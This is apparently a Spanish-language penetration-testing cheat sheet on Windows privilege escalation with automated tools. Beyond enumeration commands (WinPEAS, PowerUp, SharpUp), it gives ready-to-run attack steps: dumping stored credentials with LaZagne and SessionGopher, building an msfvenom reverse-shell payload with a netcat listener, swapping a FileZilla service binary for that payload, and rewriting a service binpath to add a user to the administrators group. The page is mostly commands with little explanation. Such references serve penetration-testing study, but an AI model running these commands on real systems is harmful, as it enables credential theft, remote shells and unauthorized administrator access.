Herramientas automatizadas

Las herramientas automatizadas aceleran la enumeración y detección de malas configuraciones, pero sus hallazgos deben validarse manualmente antes de ejecutar una técnica de escalada.

Links

Enumeración completa

WinPEAS

PowerShell: Lanzar cualquier binario: .ps1, .bat, .exe

winpeas.exe
powershell -ep bypass ./winPEAS.ps1

PowerUp

PowerShell: Buscar todas las posibles vulnerabilidades

. .\PowerUp.ps1
Invoke-AllChecks

AuxRecon.ps1 (PowerShell)

PowerShell: Enumerar todo el sistema semi-automático

Import-Module .\recon.ps1
# Lanzar módulos: recon.programs, recon.users ...

Credenciales Almacenadas

LaZagne

PowerShell: Credenciales en Aplicaciones

# Lanzar todos los módulos de LaZagne para recuperar credenciales en aplicaciones comunes
.\LaZagne.exe all

SessionGopher

PowerShell: Credenciales en Herramientas y Registros

# Extrae credenciales de herramientas como RDP, PuTTY, WinSCP, FileZilla, SuperPuTTY
. .\SessionGopher.ps1
Invoke-SessionGopher -Thorough

Permisos mal configurados

PowerUp

PowerShell: Permisos mal configurados y credenciales en texto claro

# Buscar servicios vulnerables a modificaciones del binario
. .\PowerUp.ps1
Invoke-PrivescAudit # Busca Servicios mal configurados y credenciales en texto claro
# Servicio vulnerable: FileZilla
# Path: "C:\Program Files (x86)\FileZilla Server.exe"
icacls "C:\Program Files (x86)\FileZilla Server.exe"

Kali: Payload y Listener

msfvenom -p windows/shell_reverse_tcp lhost=<kali_ip> lport=443 -f exe > 'FileZilla Server.exe'
rlwrap nc -lnvp 443

CMD: Sustituir 'FileZilla Server.exe' original por el nuestro

cmd /c copy /Y 'FileZilla Server.exe' "C:\Program Files (x86)\FileZilla Server.exe"

CMD: Reiniciar Servicios

sc.exe stop "FileZillaServer"
sc.exe start "FileZillaServer"

SharpUp

CMD: Permisos mal configurados

# Buscar servicios vulnerables a modificaciones en el Path
SharpUp.exe audit
# Servicio vulnerable: WindscribeService
# Path: C:\Program Files (x86)\Windscribe\WindscribeService.exe
icacls "C:\Program Files (x86)\Windscribe\WindscribeService.exe"

CMD: Editar Path para añadir a nuestro usuario actual al grupo de administradores

sc config WindscribeService binpath="cmd /c net localgroup administrators <user> /add"

CMD: Reiniciar Servicio

sc stop "WindscribeService"
sc start "WindscribeService"

CMD: Comprobar Escalada

net localgroup administrators
# Reiniciar Terminal
